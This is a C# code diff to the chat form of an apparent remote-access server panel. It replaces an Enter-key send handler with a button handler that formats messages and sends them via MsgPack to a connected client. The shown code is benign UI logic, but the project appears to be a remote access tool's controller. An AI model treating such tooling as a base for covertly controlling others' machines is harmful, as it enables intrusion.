@@ -28,19 +28,6 @@ namespace Server.Forms
             InitializeComponent();
         }
 
-        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
-        {
-            if (textBox1.Enabled && e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
-            {
-                richTextBox1.AppendText("ME: " + textBox1.Text + Environment.NewLine);
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Pac_ket").AsString = "chatWriteInput";
-                msgpack.ForcePathObject("Input").AsString = Nickname + ": " + textBox1.Text;
-                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-                textBox1.Clear();
-            }
-        }
-
         private void FormChat_Load(object sender, EventArgs e)
         {
             string nick = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin");
@@ -77,6 +64,23 @@ namespace Server.Forms
                 if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
             }
             catch { }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (textBox1.Enabled && !string.IsNullOrWhiteSpace(textBox1.Text))
+            {
+                richTextBox1.SelectionColor = Color.Green;
+                richTextBox1.AppendText("ME: \n");
+                richTextBox1.SelectionColor = Color.Black;
+                richTextBox1.AppendText(textBox1.Text + Environment.NewLine);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "chatWriteInput";
+                msgpack.ForcePathObject("Input").AsString = Nickname + ": \n";
+                msgpack.ForcePathObject("Input2").AsString = textBox1.Text;
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+                textBox1.Clear();
+            }
         }
     }
 }
